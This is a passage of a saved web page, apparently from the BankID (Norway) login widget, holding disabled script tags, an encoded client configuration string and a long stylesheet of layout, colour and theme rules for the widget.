bis_size="{&quot;x&quot;:338,&quot;y&quot;:274,&quot;w&quot;:19,&quot;h&quot;:19,&quot;abs_x&quot;:972,&quot;abs_y&quot;:361}"></path></svg></button></div></div></div></div></div></div></div></main></div></div></div></div><script data-savepage-type="text/javascript" type="text/plain" data-savepage-src="https://csfe.bankid.no/jsclient21/error.js"></script><script data-savepage-type="text/javascript" type="text/plain" data-conf="u52GCBcvPJfTeELcUy7RkyoAAABvwLcvBYeFF5s6qfXGZh922JO6hWl7giLOK6RRcFkIRJTwY4wSxDvaWsYrlzDgLFjTYmEKSLgPQU4q7bnVUDFM44c4-z2OUNb0q7cD09BOCW9WgasIBDbLRXX6NDzkc0wiIoYMDkoUDeueJmWdnUVH_C_weipoFOGl6mvuhoHiclcUbJJsOQEOm2jUWCYGNh-Qqx-IHfkOveLAsjh0xrzxagSHwxIELgje7zqhYj2Z9tFFinO1xz6JNI-ZRVUCTDbdNReNXOaRf0zDGKKsLS01ajOc07XG2VFf-MzcbNO9WbbApXSJ_Joxy7gCCu8a0cwUHNn9MdoatJdBa8n6wuCMYqaXfX7tttrC5cA_s4MUgptWZSZ6h363ufYM5pEIMij_0JP1TwVULstTtTsZ7eik5K9_syGCe4VP46MWgkcFQ5dUUJNDYeeFJQVK9I61fK03CFWpIW9u6e6ABw5KWWfUyTHF_T3tUbTnI0pTfGK_-LP2pp_ePsKoTWWSYB5e7aluB-cIsa3HlI7EHo8PCTAwBBqmoJQaJsy2GvSvXRvTX2kBKicfixh4Eu2ndoZx280ZceOGwbkXK_WALjOBcs2yWZQSjAROwexwGbDxk1F5jmR50rmsYLpghi03LGdLbY2zH0ZU0U67YDWMdEtYhQMXnA-Bs-c7SYtP57aCn_nRKiHS1l1fNaaNXldzmrRR6FlwQ1fGQb8RsR7IClzax0_a7w7oMrzzLsm6wz5X-7gTxUG1Rsspqactg0LMgDdhZ0OsEM2gD6sI5vddZuyKg99wCrdwWmJSz0syPFUj2gbHWE72t-_Yn7wiSrpSlP3JiiEAijMeV4WRNTczf3pOffCoYPxtQQeYq8dtbjQ4cL5WfNyAl9qMlVCIauh3pEK34_aSCRkjplbttXqkw5RF9caTaaN-4E_zbMSY2SldLeTODn_KIwV8Pbwod6ITSI-VVsh_HrtuvZmLrNjv7_P0HaaWGd25ib8wVVzz3zUJg8dBW7lRDC3Fy3WH3RUt3Q6cpvCbZx84l6nzWYkUyNHfHEIvf3HwxGAZ_63Lj_EWOfjshqTsZGrXDlQTRsTJNh6T6OIECRPGjOk0LHD3cl0MOe2lGrFaeqWMPEd0yxaT2OlgSj6NscE6AO8TCn7-tsEH969wmfrIIoPq58GYfDENvfojLO3Wfl8KUOYnrLJdbAZXGBlfwU68_l9FRMtXqc2dbP7tAwpQNLLwODwbg1uinNXWshXDfNp12Mc4_DrUh8vKUGiKNRIFXOGFKJWz9-LwvVTgiBAklXScG4ZBajQgkBc0J8SmWRXfFi7B2yKe257KDy61EP_co6tuCE5V253d9fgRtRR2CvsKwG1A2XgsrngVXCNKpaw4GZJJKjvNHRJrqOwi5fMPvuhHbzgkQXEVnyrTW0q9zTH0elFc2BnINwslypDDeyByc_ERKtBQaQ4Ac-i3Esu1d8Q4f9UBwM5mleiLG3qxXouYMfW5YB69Wg" data-savepage-src="https://csfe.bankid.no/CentralServerFEJS/b/KgAAALeMZD8t1MPRpPmolHNpFEEul8w0CcGGxqGplJ4lPBxD2oi8Tboru_3Xy1RnhntzhyJFTqJRjbPlKt0Wp8K35n4QWy0FYl8"></script><script data-savepage-type="" type="text/plain"></script></body></html>" srcdoc="<!DOCTYPE html><html lang=&quot;nb&quot;><head><base href=&quot;https://csfe.bankid.no/CentralServerFEJS/a?cid=buZCzSzH1x4pcRZa&quot;><script data-savepage-type=&quot;&quot; data-savepage-type=&quot;text/plain&quot; type=&quot;text/plain&quot; data-savepage-src=&quot;chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js&quot;></script><script data-savepage-type=&quot;&quot; data-savepage-type=&quot;text/plain&quot; type=&quot;text/plain&quot; data-savepage-src=&quot;chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js&quot;></script><base href=&quot;https://csfe.bankid.no/CentralServerFEJS/a?cid=buZCzSzH1x4pcRZa&quot;><style data-savepage-href=&quot;/jsclient21/css/bid_202609080750.css&quot; type=&quot;text/css&quot;>.bid-link-button{color:var(--fgColor-link-rest);text-decoration:underline}.bid-link-button:disabled{opacity:.65;text-decoration:none}.bid-link-button:not(:disabled):hover{color:var(--fgColor-link-hover)}.bid-link-button:not(:disabled):active{color:var(--fgColor-link-active)}.bid-link-button:not(:disabled):focus-visible{box-shadow:var(--shadow-focusOuter)}.bid-layout{align-items:flex-start;display:flex;flex-direction:column;font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-M);font-weight:500;gap:var(--gap-content-L);letter-spacing:0;line-height:1.17}a,abbr,acronym,address,applet,article,aside,audio,b,big,blockquote,body,canvas,caption,center,cite,code,dd,del,details,dfn,div,dl,dt,em,embed,fieldset,figcaption,figure,footer,form,h1,h2,h3,h4,h5,h6,header,hgroup,html,i,iframe,img,ins,kbd,label,legend,li,main,mark,menu,nav,object,ol,output,p,pre,q,ruby,s,samp,section,small,span,strike,strong,sub,summary,sup,table,tbody,td,tfoot,th,thead,time,tr,tt,u,ul,var,video{border:0;font:inherit;font-size:100%;margin:0;padding:0;vertical-align:baseline}article,aside,details,figcaption,figure,footer,header,hgroup,main,menu,nav,section{display:block}[hidden]{display:none}menu,ol,ul{list-style:none}blockquote,q{quotes:none}blockquote:after,blockquote:before,q:after,q:before{content:&quot;&quot;;content:none}table{border-collapse:collapse;border-spacing:0}*,:after,:before{border:0;box-sizing:border-box;margin:0;outline:0;padding:0}button,input,select,textarea{background:none;color:inherit;font-family:inherit;font-size:inherit;line-height:inherit;text-align:left}a{color:inherit}:root{--spacing-6XS:2px;--spacing-5XS:4px;--spacing-4XS:6px;--spacing-3XS:8px;--spacing-2XS:10px;--spacing-XS:12px;--spacing-S:16px;--spacing-M:24px;--spacing-L:32px;--borderRadius-2XS:4px;--borderRadius-XS:8px;--borderRadius-S:12px;--borderRadius-M:18px;--borderRadius-L:24px;--borderRadius-interactive-M:8px;--borderRadius-interactive-L:8px;--fontSize-S:14px;--fontSize-M:16px;--fontSize-L:18px;--fontSize-XL:20px;--fontSize-2XL:24px;--fontSize-3XL:26px;--component-OtpChallenge-fontSize-L:36px;--component-OtpChallenge-spinner:60px;--component-Form-height-large:285px;--component-Form-width-large:320px;--component-Form-width-medium:360px;--component-Form-gap-inputs:var(--spacing-2XS);--component-Button-Round-size-M:18px;--component-Button-Round-size-L:22px;--component-Button-height-L:32px;--component-Button-height-M:26px;--component-Button-height-S:20px;--component-Error-icon-L:48px;--sizing-interactive-M:38px;--sizing-interactive-L:48px;--sizing-icon-S:16px;--sizing-icon-M:20px;--sizing-icon-L:24px;--sizing-content-width:370px;--sizing-content-height:250px;--borderSize-focus:2px;--borderSize-focusOuter:3px;--borderSize-underline:2px;--app-Width:450px;--app-Height:520px;--app-padding-horizontal:16px;--app-padding-vertical:10px;--app-padding-content:4px;--app-borderRadius-L:16px;--app-Body-height:390px;--app-Modal-padding-top:20px;--app-Modal-padding-bottom:16px;--gap-content-L:10px;--shadow-focus:inset 0px 0px 0px var(--borderSize-focus) var(--fgColor-default);--shadow-focusOuter:0px 0px 0px 1px var(--bgColor-default),0px 0px 0px var(--borderSize-focusOuter) var(--fgColor-default);--shadow-danger:inset 0px 0px 0px 1px var(--fgColor-status-danger);--shadow-dangerFocus:inset 0px 0px 0px var(--borderSize-focus) var(--fgColor-status-danger);--shadow-hover:0px 4px 4px 0px var(--borderColor-hover);--shadow-button-outline-rest:inset 0px 0px 0px 1px var(--fgColor-variant);--shadow-button-outline-hover:inset 0px 0px 0px 1px var(--fgColor-variant);--shadow-button-outline-active:inset 0px 0px 0px 1px var(--fgColor-variant);--shadow-form-rest:inset 0px 0px 0px 1px var(--fgColor-default)}:root [data-bid-size=smaller]{--spacing-5XS:2px;--spacing-4XS:4px;--spacing-3XS:6px;--spacing-2XS:8px;--spacing-XS:10px;--spacing-S:12px;--spacing-M:16px;--spacing-L:24px;--borderRadius-XS:4px;--borderRadius-S:8px;--borderRadius-M:12px;--borderRadius-L:18px;--borderRadius-interactive-L:8px;--fontSize-M:14px;--fontSize-L:16px;--fontSize-XL:18px;--fontSize-2XL:20px;--fontSize-3XL:24px;--component-Button-Round-size-L:18px;--component-Button-height-L:26px;--component-Button-height-M:20px;--sizing-interactive-L:38px;--sizing-icon-M:16px;--sizing-icon-L:20px}@media (max-height:350px){:root{--spacing-6XS:1px;--spacing-5XS:2px;--spacing-4XS:4px;--spacing-3XS:6px;--spacing-2XS:8px;--spacing-XS:10px;--spacing-S:12px;--spacing-M:16px;--spacing-L:24px;--borderRadius-2XS:2px;--borderRadius-XS:4px;--borderRadius-S:8px;--borderRadius-M:12px;--borderRadius-L:18px;--borderRadius-interactive-M:4px;--borderRadius-interactive-L:4px;--fontSize-S:14px;--fontSize-M:16px;--fontSize-L:18px;--fontSize-XL:20px;--fontSize-2XL:24px;--fontSize-3XL:26px;--component-OtpChallenge-fontSize-L:30px;--component-OtpChallenge-spinner:40px;--component-Form-height-large:160px;--component-Form-width-large:360px;--component-Form-width-medium:300px;--component-Form-gap-inputs:var(--spacing-2XS);--component-Button-Round-size-M:16px;--component-Button-Round-size-L:20px;--component-Button-height-L:26px;--component-Button-height-M:22px;--component-Button-height-S:16px;--component-Error-icon-L:36px;--sizing-interactive-M:28px;--sizing-interactive-L:38px;--sizing-icon-S:14px;--sizing-icon-M:16px;--sizing-icon-L:20px;--sizing-content-width:370px;--sizing-content-height:0px;--borderSize-focus:2px;--borderSize-focusOuter:3px;--borderSize-underline:2px;--app-Width:396px;--app-Height:300px;--app-padding-horizontal:8px;--app-padding-vertical:8px;--app-padding-content:4px;--app-borderRadius-L:8px;--app-Body-height:260px;--app-Modal-padding-top:16px;--app-Modal-padding-bottom:10px;--gap-content-L:6px}:root [data-bid-size=smaller]{--spacing-5XS:1px;--spacing-4XS:2px;--spacing-3XS:4px;--spacing-2XS:6px;--spacing-XS:8px;--spacing-S:10px;--spacing-M:12px;--spacing-L:16px;--borderRadius-XS:2px;--borderRadius-S:4px;--borderRadius-M:8px;--borderRadius-L:12px;--borderRadius-interactive-L:4px;--fontSize-M:14px;--fontSize-L:16px;--fontSize-XL:18px;--fontSize-2XL:20px;--fontSize-3XL:24px;--component-Button-Round-size-L:16px;--component-Button-height-L:22px;--component-Button-height-M:16px;--sizing-interactive-L:28px;--sizing-icon-M:14px;--sizing-icon-L:16px}}:root{--font-body-S-Regular:400 var(--fontSize-S)/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--font-body-S-Regular-lineHeight:calc(var(--fontSize-S)*1.17);--font-body-S-Medium:500 var(--fontSize-S)/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--font-body-S-Medium-lineHeight:calc(var(--fontSize-S)*1.17);--font-body-S-Bold:600 var(--fontSize-S)/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--font-body-S-Bold-lineHeight:calc(var(--fontSize-S)*1.17);--font-body-M-Regular:400 var(--fontSize-M)/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--font-body-M-Regular-lineHeight:calc(var(--fontSize-M)*1.17);--font-body-M-Medium:500 var(--fontSize-M)/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--font-body-M-Medium-lineHeight:calc(var(--fontSize-M)*1.17);--font-body-L-Regular:400 var(--fontSize-L)/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--font-body-L-Regular-lineHeight:calc(var(--fontSize-L)*1.17);--font-body-L-Medium:500 var(--fontSize-L)/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--font-body-L-Medium-lineHeight:calc(var(--fontSize-L)*1.17);--font-body-XL-Bold:600 var(--fontSize-XL)/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--font-body-XL-Bold-lineHeight:calc(var(--fontSize-XL)*1.17);--font-body-2XL-Bold:600 var(--fontSize-2XL)/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--font-body-2XL-Bold-lineHeight:calc(var(--fontSize-2XL)*1.17);--font-heading-S-Medium:500 var(--fontSize-L)/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--font-heading-S-Medium-lineHeight:calc(var(--fontSize-L)*1.17);--font-heading-S-Bold:700 var(--fontSize-L)/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--font-heading-S-Bold-lineHeight:calc(var(--fontSize-L)*1.17);--font-heading-M-Bold:600 var(--fontSize-XL)/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--font-heading-M-Bold-lineHeight:calc(var(--fontSize-XL)*1.17);--font-heading-L-Bold:600 var(--fontSize-2XL)/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--font-heading-L-Bold-lineHeight:calc(var(--fontSize-2XL)*1.17);--font-heading-XL-Bold:600 var(--fontSize-3XL)/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--font-heading-XL-Bold-lineHeight:calc(var(--fontSize-3XL)*1.17);--font-OtpChallenge-Reference-L:600 var(--component-OtpChallenge-fontSize-L)/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--font-OtpChallenge-Reference-L-lineHeight:calc(var(--component-OtpChallenge-fontSize-L)*1.17);--font-Document-L:400 var(--fontSize-M)/1.17 Courier New,Courier,monospace;--font-Document-L-lineHeight:calc(var(--fontSize-M)*1.17)}@keyframes fadeIn{0%{opacity:0}to{opacity:1}}@keyframes fadeInUp{0%{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}@keyframes fadeInLeft{0%{opacity:0;transform:translateX(10px)}to{opacity:1;transform:translateX(0)}}html{overflow:hidden;overscroll-behavior:none}body{-webkit-font-smoothing:antialiased;-webkit-tap-highlight-color:rgba(0,0,0,0);background-color:transparent;color:var(--fgColor-default);font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:10px;inset:0;line-height:1;margin:0;padding:0;position:absolute}#app{height:100%;width:100%}button,input[type=checkbox]{cursor:default}button:not(:disabled),input[type=checkbox]:not(:disabled){cursor:pointer}.bid-buttons{align-items:flex-end;display:flex;flex:1;gap:var(--spacing-2XS);justify-content:center;width:100%}.bid-grid-layout{display:grid;gap:10px;justify-items:start}:root{--bgColor-default:#faf7f4;--bgColor-elevated:#fff;--bgColor-state-hover:#ebeeeb;--bgColor-state-active:#dadeda;--bgColor-interactive-rest:var(--bgColor-elevated);--bgColor-interactive-hover:var(--bgColor-state-hover);--bgColor-interactive-active:var(--bgColor-state-active);--bgColor-interactive-variant:#c9fb88;--bgColor-variant:#c9fb88;--bgColor-backdrop-rest:rgba(0,0,0,.4);--bgColor-backdrop-merchant:var(--bgColor-default);--fgColor-default:#121a12;--fgColor-subtle:#4d514c;--fgColor-link-rest:#156200;--fgColor-link-hover:#0d4904;--fgColor-link-active:#0b3208;--fgColor-variant:#39134c;--fgColor-status-danger:#8b000f;--fgColor-status-success:#093d05;--fgColor-inverted:#f9f5ff;--borderColor-default:#6a6867;--borderColor-muted:#dadeda;--borderColor-variant:#121a12;--borderColor-focusVariant:#121a12;--borderColor-focus:#121a12;--borderColor-status-danger:#8b000f;--borderColor-hover:rgba(0,0,0,.302);--component-Document-borderColor-body:#ebeeeb;--component-Button-outline-borderColor-rest:#39134c;--component-Button-outline-borderColor-hover:#39134c;--component-Button-outline-borderColor-active:#39134c;--component-Button-filled-bgColor-rest:#39134c;--component-Button-filled-bgColor-hover:#47146a;--component-Button-filled-bgColor-active:#551488;--component-Button-filled-bgColor-invalid:rgba(249,247,255,.702);--app-Scrollbar-bgColor-default:rgba(0,0,0,.071);--app-Scrollbar-fgColor-default:var(--fgColor-inverted);--brand:var(--fgColor-variant)}@media (prefers-color-scheme:dark){html:not([data-bid-theme]){--bgColor-default:#0f150f;--bgColor-elevated:#1d211d;--bgColor-state-hover:#3c403b;--bgColor-state-active:#4d514c;--bgColor-interactive-rest:var(--bgColor-elevated);--bgColor-interactive-hover:var(--bgColor-state-hover);--bgColor-interactive-active:var(--bgColor-state-active);--bgColor-interactive-variant:#c9fb88;--bgColor-variant:#093d05;--bgColor-backdrop-rest:hsla(0,0%,100%,.4);--bgColor-backdrop-merchant:var(--bgColor-default);--fgColor-default:#eaecea;--fgColor-subtle:#ccd1cc;--fgColor-link-rest:#c9fb88;--fgColor-link-hover:#b0f666;--fgColor-link-active:#96f143;--fgColor-variant:#caafff;--fgColor-status-danger:#ffd9d9;--fgColor-status-success:#67e702;--fgColor-inverted:#121a12;--borderColor-default:#cac7c3;--borderColor-muted:#333732;--borderColor-variant:#fff;--borderColor-focusVariant:#fff;--borderColor-focus:#fff;--borderColor-status-danger:#ffd9d9;--borderColor-hover:hsla(0,0%,100%,.302);--component-Document-borderColor-body:hsla(0,0%,100%,0);--component-Button-outline-borderColor-rest:#caafff;--component-Button-outline-borderColor-hover:#caafff;--component-Button-outline-borderColor-active:#caafff;--component-Button-filled-bgColor-rest:#c09fff;--component-Button-filled-bgColor-hover:#caafff;--component-Button-filled-bgColor-active:#d5beff;--component-Button-filled-bgColor-invalid:rgba(249,247,255,.702);--app-Scrollbar-bgColor-default:hsla(0,0%,100%,.2);--app-Scrollbar-fgColor-default:var(--fgColor-inverted);--brand:#fff}html:not([data-bid-theme]) #app{color-scheme:dark}}html[data-bid-theme=dark]{--bgColor-default:#0f150f;--bgColor-elevated:#1d211d;--bgColor-state-hover:#3c403b;--bgColor-state-active:#4d514c;--bgColor-interactive-rest:var(--bgColor-elevated);--bgColor-interactive-hover:var(--bgColor-state-hover);--bgColor-interactive-active:var(--bgColor-state-active);--bgColor-interactive-variant:#c9fb88;--bgColor-variant:#093d05;--bgColor-backdrop-rest:hsla(0,0%,100%,.4);--bgColor-backdrop-merchant:var(--bgColor-default);--fgColor-default:#eaecea;--fgColor-subtle:#ccd1cc;--fgColor-link-rest:#c9fb88;--fgColor-link-hover:#b0f666;--fgColor-link-active:#96f143;--fgColor-variant:#caafff;--fgColor-status-danger:#ffd9d9;--fgColor-status-success:#67e702;--fgColor-inverted:#121a12;--borderColor-default:#cac7c3;--borderColor-muted:#333732;--borderColor-variant:#fff;--borderColor-focusVariant:#fff;--borderColor-focus:#fff;--borderColor-status-danger:#ffd9d9;--borderColor-hover:hsla(0,0%,100%,.302);--component-Document-borderColor-body:hsla(0,0%,100%,0);--component-Button-outline-borderColor-rest:#caafff;--component-Button-outline-borderColor-hover:#caafff;--component-Button-outline-borderColor-active:#caafff;--component-Button-filled-bgColor-rest:#c09fff;--component-Button-filled-bgColor-hover:#caafff;--component-Button-filled-bgColor-active:#d5beff;--component-Button-filled-bgColor-invalid:rgba(249,247,255,.702);--app-Scrollbar-bgColor-default:hsla(0,0%,100%,.2);--app-Scrollbar-fgColor-default:var(--fgColor-inverted);--brand:#fff}html[data-bid-theme=dark] #app{color-scheme:dark}.ul9tGGaWnp8-{display:flex;flex-direction:column;justify-content:center}@media (max-width:370px){.ul9tGGaWnp8-{overflow:hidden;width:22px}}.ul9tGGaWnp8- svg path{fill:var(--brand)}.ul9tGGaWnp8-.bAyLM67dKUA-{overflow:hidden;width:22px}._0GDSvZVsPEo-{--button-icon--color:var(--fgColor-default);--button-icon--background-color:transparent;--button-icon--shadow:none;--button-icon__badge--pos:3px;align-items:center;background-color:var(--button-icon--background-color);border-radius:8px;box-shadow:var(--button-icon--shadow);color:var(--button-icon--color);display:flex;font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-L);font-weight:500;gap:var(--spacing-5XS);height:var(--component-Button-height-L);letter-spacing:0;line-height:1.17;padding:0 var(--spacing-3XS);position:relative;transition:opacity .15s ease-in-out;white-space:nowrap}@media (max-height:350px){._0GDSvZVsPEo-{--button-icon__badge--pos:0}}._0GDSvZVsPEo-:not(:disabled):active,._0GDSvZVsPEo-:not(:disabled):hover,._0GDSvZVsPEo-:not(:disabled)[aria-expanded=true]{background-color:var(--button-icon--background-color)}._0GDSvZVsPEo-:not(:disabled):focus-visible{box-shadow:var(--shadow-focus)}._0GDSvZVsPEo-:disabled{opacity:.65}._0GDSvZVsPEo-[data-variant=outline]{--button-icon--color:var(--fgColor-variant);--button-icon--background-color:var(--bgColor-default);--button-icon--shadow:var(--shadow-button-outline-rest)}._0GDSvZVsPEo-[data-variant=outline]:not(:disabled):hover{--button-icon--background-color:var(--bgColor-state-hover)}._0GDSvZVsPEo-[data-variant=outline]:not(:disabled):active,._0GDSvZVsPEo-[data-variant=outline]:not(:disabled)[aria-expanded=true]{--button-icon--background-color:var(--bgColor-state-active)}._0GDSvZVsPEo-[data-variant=outline]:not(:disabled):focus-visible{--button-icon--shadow:var(--shadow-focus)}._0GDSvZVsPEo-[data-variant=transparent]{--button-icon--color:var(--fgColor-variant);--button-icon--background-color:var(--bgColor-default);--button-icon--shadow:none}._0GDSvZVsPEo-[data-variant=transparent]:not(:disabled):hover{--button-icon--background-color:var(--bgColor-state-hover)}._0GDSvZVsPEo-[data-variant=transparent]:not(:disabled):active,._0GDSvZVsPEo-[data-variant=transparent]:not(:disabled)[aria-expanded=true]{--button-icon--background-color:var(--bgColor-state-active)}._0GDSvZVsPEo-[data-variant=transparent]:not(:disabled):focus-visible{--button-icon--shadow:var(--shadow-focus)}._0GDSvZVsPEo-[data-variant=tonal]{--button-icon--color:var(--fgColor-variant);--button-icon--background-color:var(--bgColor-elevated);--button-icon--shadow:none}._0GDSvZVsPEo-[data-variant=tonal]:not(:disabled):hover{--button-icon--background-color:var(--bgColor-state-hover)}._0GDSvZVsPEo-[data-variant=tonal]:not(:disabled):active,._0GDSvZVsPEo-[data-variant=tonal]:not(:disabled)[aria-expanded=true]{--button-icon--background-color:var(--bgColor-state-active)}._0GDSvZVsPEo-[data-variant=tonal]:not(:disabled):focus-visible{--button-icon--shadow:var(--shadow-focus)}.-PPFWqIwp-w-{white-space:normal}.owg3SWE7I-4-{align-items:center;display:flex;height:var(--sizing-icon-L);width:var(--sizing-icon-L)}.owg3SWE7I-4- svg{height:100%;width:100%}.owg3SWE7I-4- svg path{fill:var(--button-icon--color)}._9h1b5-eJ21E-{background-color:var(--fgColor-status-danger);border-radius:999px;content:&quot;&quot;;height:7px;left:var(--button-icon__badge--pos);position:absolute;top:var(--button-icon__badge--pos);width:7px}.XMrJ483EtrA-{animation:-PNYBA73te8- 1.75s ease-in-out infinite;height:100%;width:100%}.XMrJ483EtrA- path{fill:var(--fgColor-variant)}.XMrJ483EtrA-.weP6h1N3C54- path{fill:var(--fgColor-inverted)}@keyframes -PNYBA73te8-{0%{transform:rotate(0)}20%{transform:rotate(175deg)}50%{transform:rotate(180deg)}70%{transform:rotate(355deg)}to{transform:rotate(1turn)}}.jlKf2GEnW3s-{font-size:var(--fontSize-M);font-weight:400}._6Ce-3xAu4qE-,.jlKf2GEnW3s-{font-family:-apple-system,BlinkMacSystemFont,sans-serif;letter-spacing:0;line-height:1.17}._6Ce-3xAu4qE-{align-items:center;background-color:var(--bgColor-elevated);border-radius:var(--borderRadius-XS);color:var(--fgColor-default);column-gap:var(--spacing-5XS);display:flex;font-size:var(--fontSize-L);font-weight:500;min-height:var(--sizing-interactive-L);overflow-wrap:break-word;padding:var(--spacing-5XS) var(--spacing-S);position:relative;text-align:left;transition:opacity .15s ease-in-out}._6Ce-3xAu4qE-:disabled{opacity:.65}._6Ce-3xAu4qE-:not(:disabled):hover{background:var(--bgColor-state-hover)}._6Ce-3xAu4qE-:not(:disabled):active{background:var(--bgColor-state-active)}._6Ce-3xAu4qE-:not(:disabled):focus-visible{box-shadow:var(--shadow-focus)}._6Ce-3xAu4qE-:not(:disabled):focus-visible .qfnuWaM56ZE-,._6Ce-3xAu4qE-:not(:disabled):hover .qfnuWaM56ZE-{transform:translate(2px)}._6Ce-3xAu4qE-.NnvEDHWeiG4-{padding-left:var(--spacing-3XS)}._6Ce-3xAu4qE-.DBLdRRR1xYk- .des8c2MWDHg-.nWKhN1EAUGw-{display:flex}._6Ce-3xAu4qE-.DBLdRRR1xYk- .des8c2MWDHg-.qfnuWaM56ZE-{display:none}.byGxdtOkfzU-{display:flex;flex:1;flex-direction:column;min-width:0}.byGxdtOkfzU-.OICxGmpcKe8->*{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.jlKf2GEnW3s-{color:var(--fgColor-subtle)}.XitdDFyp8Bw-{align-items:center;display:flex}.XitdDFyp8Bw- svg{height:var(--sizing-icon-L);width:var(--sizing-icon-L)}.XitdDFyp8Bw- svg path{fill:var(--fgColor-subtle)}.des8c2MWDHg-{align-items:center;display:flex}.des8c2MWDHg- svg{height:var(--sizing-icon-S);width:var(--sizing-icon-S)}.des8c2MWDHg-.nWKhN1EAUGw-{animation:fadeIn .25s ease-in-out}.des8c2MWDHg-.qfnuWaM56ZE- svg path{fill:var(--fgColor-subtle)}._7PndrQmLTBI-{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-S);font-weight:400;letter-spacing:0;line-height:1.17}.iQIgqIlh1BM-{gap:var(--gap-content-L);max-height:100%}.iQIgqIlh1BM-,.zboHRv9OqlY-{display:flex;flex-direction:column}.zboHRv9OqlY-{gap:var(--spacing-5XS)}.cJhBAvyfajE-{display:flex;flex-direction:column;gap:var(--gap-content-L)}._7PndrQmLTBI-{color:var(--fgColor-subtle)}._9z1U54gUQEg-{--header__headline--font:600 26px/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--header__headline--height:30.42px;align-items:center;display:grid;gap:var(--gap-content-L);grid-template:&quot;. logo action&quot;;grid-template-columns:1fr auto 1fr;height:100%;margin:0 var(--app-padding-horizontal);position:relative}._9z1U54gUQEg-[data-has-back=true]{grid-template:&quot;back logo action&quot;}._9z1U54gUQEg-[data-has-back=true] .Nv0kK8uGeS0-{display:flex}[data-header-size=dense] ._9z1U54gUQEg-{grid-template:&quot;. logo action&quot;;grid-template-columns:1fr auto 1fr}[data-header-size=dense] ._9z1U54gUQEg- .Z-XtFZJCw8c-{display:none}[data-header-size=dense] ._9z1U54gUQEg- .rroRwgEBZuQ-{flex:1;justify-items:end}@media (max-height:350px){._9z1U54gUQEg-{--header__headline--font:600 20px/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--header__headline--height:23.4px;display:grid;grid-template:&quot;logo headline action&quot;;grid-template-columns:auto 1fr auto}._9z1U54gUQEg- .Z-XtFZJCw8c-{display:flex}._9z1U54gUQEg- ._3--1Lzuaofk-{justify-self:start}._9z1U54gUQEg-[data-has-back=true]{grid-template:&quot;back headline action&quot;;grid-template-columns:auto 1fr auto}._9z1U54gUQEg-[data-has-back=true] ._3--1Lzuaofk-{display:none}}@media (min-height:351px){[data-header-size=compressed] ._9z1U54gUQEg-{--header__headline--font:600 20px/1.17 -apple-system,BlinkMacSystemFont,sans-serif;--header__headline--height:23.4px;display:grid;grid-template:&quot;logo headline action&quot;;grid-template-columns:auto 1fr auto}[data-header-size=compressed] ._9z1U54gUQEg- .Z-XtFZJCw8c-{display:flex}[data-header-size=compressed] ._9z1U54gUQEg- ._3--1Lzuaofk-{justify-self:start}[data-header-size=compressed] ._9z1U54gUQEg-[data-has-back=true]{grid-template:&quot;back headline action&quot;;grid-template-columns:auto 1fr auto}[data-header-size=compressed] ._9z1U54gUQEg-[data-has-back=true] ._3--1Lzuaofk-{display:none}}.Nv0kK8uGeS0-{display:none;grid-area:back;justify-self:flex-start}._3--1Lzuaofk-{align-items:center;display:flex;grid-area:logo;justify-self:center}.Z-XtFZJCw8c-{align-items:center;display:none;grid-area:headline;justify-content:start;min-width:0;width:100%}.Z-XtFZJCw8c- h1{font:var(--header__headline--font);min-height:var(--header__headline--height);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.Z-XtFZJCw8c- h1:focus-visible span{position:relative}.Z-XtFZJCw8c- h1:focus-visible span:after{border-bottom:var(--borderSize-focus) solid var(--borderColor-focus);bottom:calc(var(--borderSize-focus)*-1);content:&quot;&quot;;left:0;position:absolute;right:0}.Z-XtFZJCw8c- h1:focus-visible span:after{bottom:0}.rroRwgEBZuQ-{grid-area:action;justify-self:flex-end}.AZhftGJX1fQ-{--header:minmax(30px,1fr);--body:8fr;background-color:var(--bgColor-default);border:1px solid var(--borderColor-muted);border-radius:var(--app-borderRadius-L);display:grid;grid-template-columns:100%;grid-template-rows:var(--header) var(--body);height:100%;overflow:hidden;position:relative;width:100%}.AZhftGJX1fQ-.x2O7koFfiAM-{transition:grid-template-rows .25s ease-in-out}@media (min-height:351px){.AZhftGJX1fQ-[data-header-size=compressed]{--header:minmax(40px,40px);--body:auto}}.AFP4hM8sct4-{max-height:130px;min-width:0}.lH9xEtG2mCI-{height:100%;min-height:0}.s0ZrHgbtNiI-{inset:0;position:absolute}._51c-BF0XNyo-{align-items:center;background-color:var(--bgColor-default);border-radius:999px;color:var(--fgColor-default);display:flex;font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-L);font-weight:500;letter-spacing:0;line-height:1.17;min-height:var(--sizing-interactive-L);padding:var(--spacing-5XS) var(--spacing-L);position:relative;text-align:center;transition:opacity .15s ease-in-out,background-color .15s ease-in-out,color .15s ease-in-out;white-space:nowrap}._51c-BF0XNyo-[aria-busy=true] .nQChUFhlcL0-{display:flex}._51c-BF0XNyo-[aria-busy=true] 